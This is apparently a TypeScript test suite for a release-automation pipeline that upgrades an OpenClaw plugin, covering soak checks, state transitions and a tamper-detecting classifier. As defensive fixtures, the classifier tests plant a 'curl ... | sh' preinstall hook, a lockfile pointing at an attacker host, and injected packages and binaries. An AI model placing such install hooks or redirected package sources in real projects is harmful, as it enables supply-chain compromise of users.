import assert from "node:assert/strict";
import { mkdir, mkdtemp, readFile, rm, writeFile } from "node:fs/promises";
import os from "node:os";
import path from "node:path";
import test from "node:test";
import { fileURLToPath } from "node:url";
import { classifyPreparedUpgrade } from "../scripts/classify-openclaw-upgrade.mjs";
import { applyReleaseStateIntent, createReleaseState, decideReleaseResume, validateReleaseState } from "../scripts/openclaw-release-state.mjs";
import { assessUpgradeEvidence, compareOpenClawVersions, validateUpgradePreflight } from "../scripts/openclaw-upgrade-policy.mjs";
import { buildPreparedFiles, nextPatchVersion, PREPARATION_FILES, prepareOpenClawUpgrade } from "../scripts/prepare-openclaw-upgrade.mjs";

const root = path.resolve(fileURLToPath(new URL("..", import.meta.url)));
const hex = (character: string, length: number) => character.repeat(length);
const currentQualification = JSON.parse(await readFile(path.join(root, "openclaw-qualification.json"), "utf8"));
const currentPlugin = JSON.parse(await readFile(path.join(root, "packages/openclaw-plugin/package.json"), "utf8"));
const currentVersion = currentQualification.stableVersion as string;
const currentPluginVersion = currentPlugin.version as string;
const proposedParts = currentVersion.split(".").map(Number);
const proposedVersion = `${proposedParts[0]}.${proposedParts[1]}.${proposedParts[2] + 1}`;
const nextFloor = `${proposedParts[0]}.${proposedParts[1]}.${proposedParts[2] + 2}-0`;
const proposedPluginVersion = nextPatchVersion(currentPluginVersion);

function preflight(observedAt = "2026-09-22T01:00:00.000Z") {
  return {
    format: "thunderclaw-openclaw-upgrade-preflight-v2" as const,
    observedAt,
    current: { version: currentVersion, releaseCommit: currentQualification.upstream.releaseCommit as string, pluginVersion: currentPluginVersion },
    proposed: {
      version: proposedVersion,
      npm: { package: "openclaw" as const, version: proposedVersion, integrity: "sha512-AAAA", tarball: `https://registry.npmjs.org/openclaw/-/openclaw-${proposedVersion}.tgz` },
      providerNpm: { package: "@openclaw/deepseek-provider", version: proposedVersion, integrity: "sha512-BBBB", tarball: "https://registry.npmjs.org/provider.tgz" },
      upstream: { repository: "openclaw/openclaw", tag: `v${proposedVersion}`, releaseTag: `v${proposedVersion}`, commit: hex("a", 40), verifiedTag: false, verifiedCommit: false, tagKind: "lightweight" as const, officialRelease: true as const, releaseId: 42, releaseUrl: `https://github.com/openclaw/openclaw/releases/tag/v${proposedVersion}`, publishedAt: "2026-09-22T00:00:00.000Z", draft: false as const, prerelease: false as const },
      image: { repository: "ghcr.io/openclaw/openclaw", tag: proposedVersion, indexDigest: `sha256:${hex("c", 64)}`, linuxAmd64Digest: `sha256:${hex("d", 64)}` },
    },
    sdk: {
      requiredEntrypoints: ["./plugin-sdk/agent-runtime", "./plugin-sdk/cli-argv", "./plugin-sdk/gateway-runtime", "./plugin-sdk/plugin-entry"],
      missingEntrypoints: [] as string[],
      declarationFiles: ["dist/plugin-sdk/agent-runtime.d.ts", "dist/plugin-sdk/cli-argv.d.ts", "dist/plugin-sdk/gateway-runtime.d.ts", "dist/plugin-sdk/plugin-entry.d.ts"],
      changedDeclarations: [],
      currentHashes: Object.fromEntries(["agent-runtime", "cli-argv", "gateway-runtime", "plugin-entry"].map((name) => [`dist/plugin-sdk/${name}.d.ts`, hex("1", 64)])),
      proposedHashes: Object.fromEntries(["agent-runtime", "cli-argv", "gateway-runtime", "plugin-entry"].map((name) => [`dist/plugin-sdk/${name}.d.ts`, hex("2", 64)])),
    },
    upstreamCi: { conclusion: "failure", waived: true },
    repositoryImpact: ["scripts/forged-allowlist.mjs"],
    blockingFindings: [] as string[], advisoryFindings: ["upstream release tag is unsigned or unverified"],
    compatibilityDecision: "not-made" as const,
  };
}

async function repositoryFiles() {
  return Object.fromEntries(await Promise.all(PREPARATION_FILES.map(async (file) => [file, await readFile(path.join(root, file), "utf8")])));
}

function generatedLockfile(contents: string) {
  const lock = JSON.parse(contents);
  lock.packages[""].devDependencies.openclaw = `^${proposedVersion}`;
  lock.packages["packages/openclaw-plugin"].version = proposedPluginVersion;
  lock.packages["packages/openclaw-plugin"].peerDependencies.openclaw = `>=${currentQualification.apiFloor} <${nextFloor}`;
  lock.packages["node_modules/openclaw"].version = proposedVersion;
  lock.packages["node_modules/openclaw"].resolved = `https://registry.npmjs.org/openclaw/-/openclaw-${proposedVersion}.tgz`;
  lock.packages["node_modules/openclaw"].integrity = "sha512-AAAA";
  return `${JSON.stringify(lock, null, 2)}\n`;
}

test("autopilot orders stable calendar versions and rejects prereleases", () => {
  assert.equal(compareOpenClawVersions("2026.10.0", "2026.9.99"), 1);
  assert.equal(compareOpenClawVersions("2026.9.6", "2026.9.6"), 0);
  assert.throws(() => compareOpenClawVersions("2026.9.7-beta.1", "2026.9.6"), /stable YYYY/u);
  assert.throws(() => validateUpgradePreflight({ ...preflight(), proposed: { ...preflight().proposed, version: "2026.9.5" } }), /newer/u);
});

test("24-hour soak requires two unchanged observations while unsigned tags and CI waivers stay advisory", () => {
  const baseline = preflight();
  const early = preflight("2026-09-23T00:59:59.999Z");
  const current = preflight("2026-09-23T01:00:00.000Z");
  assert.equal(assessUpgradeEvidence({ baseline, current: early }).decision, "waiting");
  const assessment = assessUpgradeEvidence({ baseline, current });
  assert.equal(assessment.decision, "ready");
  assert.deepEqual(assessment.blockers, []);
  assert.ok(assessment.advisories.includes("upstream release tag is unsigned or unverified"));
  assert.ok(assessment.advisories.includes("upstream CI was waived"));

  const mutated = structuredClone(current);
  mutated.proposed.image.linuxAmd64Digest = `sha256:${hex("e", 64)}`;
  assert.equal(assessUpgradeEvidence({ baseline, current: mutated }).decision, "blocked");
  const missing = structuredClone(current);
  missing.sdk.missingEntrypoints.push("./plugin-sdk/plugin-entry");
  assert.match(assessUpgradeEvidence({ baseline, current: missing }).blockers.join("\n"), /missing required export/u);
});

test("preparation generates only canonical compatibility surfaces and detects partial state", async () => {
  const files = await repositoryFiles();
  const result = buildPreparedFiles({ files, preflight: preflight(), generatedLockfile: generatedLockfile(files["package-lock.json"]), preparedDate: "2026-09-23" });
  assert.equal(result.pluginVersion, proposedPluginVersion);
  assert.equal(result.qualification.stableVersion, proposedVersion);
  assert.match(result.files["CHANGELOG.md"], new RegExp(`^# Changelog[\\s\\S]+OpenClaw plugin \\[${proposedPluginVersion.replaceAll(".", "\\.")}\\] - 2026-09-23`, "u"));
  assert.match(result.files["compose.spike.yaml"], new RegExp(`openclaw:${proposedVersion.replaceAll(".", "\\.")}@sha256:dddd`, "u"));
  assert.equal(nextPatchVersion("9.99.999"), "9.99.1000");

  const partial = { ...files, "package.json": files["package.json"].replace(`^${currentVersion}`, `^${proposedVersion}`) };
  assert.throws(() => buildPreparedFiles({ files: partial, preflight: preflight(), generatedLockfile: generatedLockfile(files["package-lock.json"]), preparedDate: "2026-09-23" }), /partial or drifted/u);
});

test("lockfile regeneration follows the prepared workspace manifests", async () => {
  const source = await readFile(path.join(root, "scripts/prepare-openclaw-upgrade.mjs"), "utf8");
  assert.match(source, /npm", "install", "--package-lock-only", "--ignore-scripts", "--no-audit", "--no-fund"/u);
  assert.doesNotMatch(source, /"--no-save"/u);
});

test("preparation reports already-prepared and rejects a conflicting partial candidate", async (context) => {
  const files = await repositoryFiles();
  const built = buildPreparedFiles({ files, preflight: preflight(), generatedLockfile: generatedLockfile(files["package-lock.json"]), preparedDate: "2026-09-23" });
  const temporary = await mkdtemp(path.join(os.tmpdir(), "thunderclaw-autopilot-prepared-"));
  context.after(async () => rm(temporary, { recursive: true, force: true }));
  const verifierFiles = [
    ...PREPARATION_FILES,
    "scripts/run-openclaw-ci.sh", "scripts/bootstrap-spike.sh", "scripts/stage-openclaw-provider.mjs", "scripts/qualify-pairing.ts",
    "e2e/qualification/real-agent/run.mjs", "packages/openclaw-plugin/src/compatibility-fingerprint.ts",
    "packages/openclaw-plugin/src/openclaw-agent-sessions.d.ts",
    ".github/workflows/ci.yml",
  ];
  for (const file of new Set(verifierFiles)) {
    await mkdir(path.dirname(path.join(temporary, file)), { recursive: true });
    await writeFile(path.join(temporary, file), built.files[file] ?? await readFile(path.join(root, file), "utf8"));
  }
  const result = await prepareOpenClawUpgrade({ root: temporary, baseline: preflight(), preflight: preflight("2026-09-23T01:00:00.000Z"), lockfileMode: "verify", preparedDate: "2026-09-23" });
  assert.equal(result.status, "already-prepared");
  const rootPackage = JSON.parse(await readFile(path.join(temporary, "package.json"), "utf8"));
  rootPackage.devDependencies.openclaw = `^${currentVersion}`;
  await writeFile(path.join(temporary, "package.json"), `${JSON.stringify(rootPackage, null, 2)}\n`);
  await assert.rejects(prepareOpenClawUpgrade({ root: temporary, baseline: preflight(), preflight: preflight("2026-09-23T01:00:00.000Z"), lockfileMode: "verify" }), /package metadata disagrees/u);
});

test("preparation accepts a durable soak waiver but never waives policy blockers", async (context) => {
  const files = await repositoryFiles();
  const temporary = await mkdtemp(path.join(os.tmpdir(), "thunderclaw-autopilot-waiver-"));
  context.after(async () => rm(temporary, { recursive: true, force: true }));
  const verifierFiles = [
    ...PREPARATION_FILES,
    "scripts/run-openclaw-ci.sh", "scripts/bootstrap-spike.sh", "scripts/stage-openclaw-provider.mjs", "scripts/qualify-pairing.ts",
    "e2e/qualification/real-agent/run.mjs", "packages/openclaw-plugin/src/compatibility-fingerprint.ts",
    "packages/openclaw-plugin/src/openclaw-agent-sessions.d.ts", ".github/workflows/ci.yml",
  ];
  for (const file of new Set(verifierFiles)) {
    await mkdir(path.dirname(path.join(temporary, file)), { recursive: true });
    await writeFile(path.join(temporary, file), files[file] ?? await readFile(path.join(root, file), "utf8"));
  }
  const generated = generatedLockfile(files["package-lock.json"]);
  const waiting = preflight("2026-09-22T02:00:00.000Z");
  await assert.rejects(prepareOpenClawUpgrade({ root: temporary, baseline: preflight(), preflight: waiting, lockfileMode: "verify", generatedLockfileContents: generated, preparedDate: "2026-09-23" }), /not ready/u);
  const accepted = await prepareOpenClawUpgrade({ root: temporary, baseline: preflight(), preflight: waiting, lockfileMode: "verify", generatedLockfileContents: generated, preparedDate: "2026-09-23", soakWaived: true });
  assert.equal(accepted.status, "prepared");
  const blocked = structuredClone(waiting);
  blocked.sdk.missingEntrypoints.push("./plugin-sdk/plugin-entry");
  await assert.rejects(prepareOpenClawUpgrade({ root: temporary, baseline: preflight(), preflight: blocked, lockfileMode: "verify", generatedLockfileContents: generated, preparedDate: "2026-09-23", soakWaived: true }), /missing required export/u);
});

test("classifier ignores a forged manifest allowlist and rejects scripts, unrelated dependencies, modes, and paths", async () => {
  const before = await repositoryFiles();
  const built = buildPreparedFiles({ files: before, preflight: preflight(), generatedLockfile: generatedLockfile(before["package-lock.json"]), preparedDate: "2026-09-23" });
  const classify = (after: any) => classifyPreparedUpgrade({ before, after, preflight: preflight(), preparedDate: "2026-09-23", expectedLockfile: built.files["package-lock.json"] });
  const accepted = classify(built.files);
  assert.equal(accepted.decision, "compatibility-only", accepted.findings.join("\n"));
  assert.ok(accepted.advisories.includes("upstream CI was waived"));
  assert.equal(accepted.files.length, accepted.changed.length);

  const script = structuredClone(built.files);
  const manifest = JSON.parse(script["package.json"]);
  manifest.scripts.preinstall = "curl https://example.invalid | sh";
  script["package.json"] = `${JSON.stringify(manifest, null, 2)}\n`;
  assert.match(classify(script).findings.join("\n"), /noncanonical content/u);

  const dependency = structuredClone(built.files);
  const lock = JSON.parse(dependency["package-lock.json"]);
  lock.packages["node_modules/typescript"].version = "0.0.0";
  dependency["package-lock.json"] = `${JSON.stringify(lock, null, 2)}\n`;
  assert.match(classify(dependency).findings.join("\n"), /unrelated lockfile package/u);

  const lifecycle = structuredClone(built.files);
  const lifecycleLock = JSON.parse(lifecycle["package-lock.json"]);
  lifecycleLock.packages["node_modules/openclaw"].hasInstallScript = false;
  lifecycle["package-lock.json"] = `${JSON.stringify(lifecycleLock, null, 2)}\n`;
  assert.match(classify(lifecycle).findings.join("\n"), /lifecycle behavior/u);

  for (const mutate of [
    (value: any) => { value.packages["node_modules/openclaw"].bin = { openclaw: "attacker.js" }; },
    (value: any) => { value.packages["node_modules/@agentclientprotocol/sdk"].resolved = "https://attacker.invalid/archive.tgz"; value.packages["node_modules/@agentclientprotocol/sdk"].integrity = "sha512-AAAA"; },
    (value: any) => {
      value.packages["node_modules/openclaw"].dependencies = { ...(value.packages["node_modules/openclaw"].dependencies ?? {}), "attacker-extra": "1.0.0" };
      value.packages["node_modules/attacker-extra"] = { version: "1.0.0", resolved: "https://registry.npmjs.org/attacker-extra/-/attacker-extra-1.0.0.tgz", integrity: `sha512-${"C".repeat(86)}==` };
    },
  ]) {
    const attacked = structuredClone(built.files);
    const attackedLock = JSON.parse(attacked["package-lock.json"]);
    mutate(attackedLock);
    attacked["package-lock.json"] = `${JSON.stringify(attackedLock, null, 2)}\n`;
    assert.equal(classify(attacked).decision, "blocked");
  }

  const withForgedPath = { ...built.files, "scripts/forged-allowlist.mjs": "malicious();\n" };
  const classification = classify(withForgedPath);
  assert.equal(classification.decision, "blocked");
  assert.match(classification.findings.join("\n"), /unexpected changed path/u);

  const descriptors = Object.fromEntries(Object.entries(built.files).map(([file, content]) => [file, { type: "file", mode: "100644", content }]));
  descriptors["package.json"] = { ...descriptors["package.json"], mode: "100755" };
  assert.match(classify(descriptors).findings.join("\n"), /mode changed/u);
});

test("release state provides strict CAS, replay, and safe resume through qualification", () => {
  const baseline = preflight();
  const state = createReleaseState(baseline, { reservationId: hex("1", 32), baseSha: hex("2", 40) });
  assert.deepEqual(decideReleaseResume(state), { action: "reobserve", revision: 0, notBefore: "2026-09-23T01:00:00.000Z" });
  const intent = (intentId: string, expectedRevision: number, type: string, payload: object, at = "2026-09-23T01:00:00.000Z") => ({ format: "thunderclaw-openclaw-autopilot-intent-v1" as const, intentId, expectedRevision, type, at, payload });
  const readyResult = applyReleaseStateIntent(state, intent("observe-2", 0, "reobserve", { preflight: preflight("2026-09-23T01:00:00.000Z"), baseSha: hex("2", 40) }, "2026-09-23T01:00:00Z") as never);
  assert.equal(readyResult.state.phase, "ready");
  assert.equal(applyReleaseStateIntent(readyResult.state, intent("observe-2", 0, "reobserve", { preflight: preflight("2026-09-23T01:00:00.000Z"), baseSha: hex("2", 40) }, "2026-09-23T01:00:00Z") as never).decision, "already-applied");
  assert.equal(applyReleaseStateIntent(readyResult.state, intent("stale", 0, "block", { reason: "stale" }) as never).decision, "compare-and-swap-mismatch");

  const counterpart = { repository: "kwatson/thunderclaw", tag: "thunderbird-extension-v0.1.2", name: "thunderclaw-extension-0.1.2.xpi", sha256: hex("3", 64), size: 100 };
  const automation = { controllerWorkflowSha: hex("4", 64), qualificationWorkflowSha: hex("5", 64), classifierSha: hex("6", 64), releaseWorkflowSha: hex("7", 64) };
  const preparation = { reservationId: hex("1", 32), pluginVersion: proposedPluginVersion, preparedDate: "2026-09-23", baseSha: hex("2", 40), branch: `codex/openclaw-${proposedVersion}`, prNumber: 10, candidateSha: hex("8", 40), candidateTree: hex("9", 40), tag: `openclaw-plugin-v${proposedPluginVersion}`, classificationEvidenceSha256: hex("a", 64), counterpart, automation };
  const prepared = applyReleaseStateIntent(readyResult.state, intent("prepare", 1, "record-preparation", preparation) as never).state;
  assert.equal(decideReleaseResume(prepared).action, "dispatch-qualification");
  const dispatch = { requestId: "request-1", workflow: "qualify-openclaw-autopilot.yml", workflowCommit: hex("b", 40), workflowSha256: automation.qualificationWorkflowSha, dispatchedAt: "2026-09-23T01:01:00.000Z" };
  const qualifying = applyReleaseStateIntent(prepared, intent("dispatch", 2, "record-qualification-dispatch", dispatch, dispatch.dispatchedAt) as never).state;
  const qualification = { ...dispatch, runId: 123, runAttempt: 1, headSha: preparation.candidateSha, headBranch: preparation.branch, event: "workflow_dispatch", conclusion: "success", evidenceSha256: hex("c", 64), classificationEvidenceSha256: preparation.classificationEvidenceSha256, candidateArtifactSha256: hex("d", 64), counterpart };
  delete (qualification as Partial<typeof qualification>).dispatchedAt;
  const qualified = applyReleaseStateIntent(qualifying, intent("qualify", 3, "record-qualification", qualification, "2026-09-23T02:00:00.000Z") as never).state;
  assert.equal(qualified.phase, "qualified");
  assert.equal(decideReleaseResume(qualified).action, "merge");
  const forgedState = structuredClone(qualified);
  forgedState.outputs.qualification.headSha = hex("f", 40);
  assert.throws(() => validateReleaseState(forgedState), /persisted qualification is inconsistent/u);
  const merged = applyReleaseStateIntent(qualified, intent("merge", 4, "record-merge", { mergeSha: hex("e", 40), mergeTree: preparation.candidateTree, tag: preparation.tag }) as never).state;
  const tagged = applyReleaseStateIntent(merged, intent("tag", 5, "record-tag", { tag: preparation.tag, commit: hex("e", 40), tree: preparation.candidateTree }) as never).state;
  const github = applyReleaseStateIntent(tagged, intent("github", 6, "record-github-publication", { tag: preparation.tag, commit: hex("e", 40), artifactSha256: hex("0", 64), releaseId: 55 }) as never).state;
  const clawhub = applyReleaseStateIntent(github, intent("clawhub", 7, "record-clawhub-verification", { tag: preparation.tag, version: preparation.pluginVersion, artifactSha256: hex("0", 64), verifiedAt: "2026-09-23T03:00:00.000Z" }) as never).state;
  const closeout = applyReleaseStateIntent(clawhub, intent("closeout", 8, "open-closeout", { branch: `automation/counterpart-${proposedPluginVersion}`, prNumber: 11, baseline: { repository: "kwatson/thunderclaw", tag: preparation.tag, name: `thunderclaw-openclaw-plugin-${proposedPluginVersion}.tgz`, sha256: hex("0", 64), size: 200 }, headSha: hex("1", 40), tree: hex("2", 40) }) as never).state;
  const complete = applyReleaseStateIntent(closeout, intent("complete", 9, "complete-closeout", { mergeSha: hex("3", 40), mergeTree: hex("4", 40) }) as never).state;
  assert.equal(complete.phase, "complete");
  assert.deepEqual(decideReleaseResume(complete), { action: "complete", revision: 10 });
  assert.equal(applyReleaseStateIntent(complete, intent("too-late", 10, "block", { reason: "late" }) as never).decision, "terminal");
  const bad = structuredClone(qualification); bad.headSha = hex("f", 40);
  assert.throws(() => applyReleaseStateIntent(qualifying, intent("bad", 3, "record-qualification", bad) as never), /differs/u);
});

test("a manual expedite records an auditable one-release soak waiver", () => {
  const state = createReleaseState(preflight(), { reservationId: hex("1", 32), baseSha: hex("2", 40) });
  const reobserved = applyReleaseStateIntent(state, {
    format: "thunderclaw-openclaw-autopilot-intent-v1",
    intentId: "observe-before-expedite",
    expectedRevision: 0,
    type: "reobserve",
    at: "2026-09-22T02:00:00.000Z",
    payload: { preflight: preflight("2026-09-22T02:00:00.000Z"), baseSha: hex("2", 40) },
  } as never).state;
  assert.equal(reobserved.phase, "observed");
  const expedited = applyReleaseStateIntent(reobserved, {
    format: "thunderclaw-openclaw-autopilot-intent-v1",
    intentId: "manual-expedite",
    expectedRevision: 1,
    type: "waive-soak",
    at: "2026-09-22T02:00:01.000Z",
    payload: { reason: `explicit manual expedite for OpenClaw ${proposedVersion}` },
  } as never).state;
  assert.equal(expedited.phase, "ready");
  assert.equal(decideReleaseResume(expedited).action, "prepare");
  assert.ok(expedited.advisories.includes(`24-hour soak waived: explicit manual expedite for OpenClaw ${proposedVersion}`));
  assert.throws(() => applyReleaseStateIntent(state, {
    format: "thunderclaw-openclaw-autopilot-intent-v1",
    intentId: "bad-waiver",
    expectedRevision: 0,
    type: "waive-soak",
    at: "2026-09-22T02:00:01.000Z",
    payload: { reason: "" },
  } as never), /reason is malformed/u);
});
